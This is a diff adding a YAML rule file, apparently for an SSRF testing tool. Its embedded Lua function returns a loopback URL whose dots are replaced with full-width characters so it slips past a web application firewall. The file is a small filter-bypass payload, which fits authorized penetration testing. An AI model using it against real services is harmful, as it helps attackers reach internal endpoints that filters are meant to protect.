@@ -1,0 +1,24 @@
+meta:
+  id: bypass_dot_utf8
+  version: 1
+  name: "Bypass with UTF-8 Dot"
+  description: "Uses full-width dot to bypass WAF"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 60
+  confidence: 75
+  severity: medium
+  tags: [utf8, dot, bypass]
+  references: []
+match:
+  schemes: [http, https]
+  requires: [hostname]
+  supports: [ipv4]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://127。0.0。1/" }
+    end
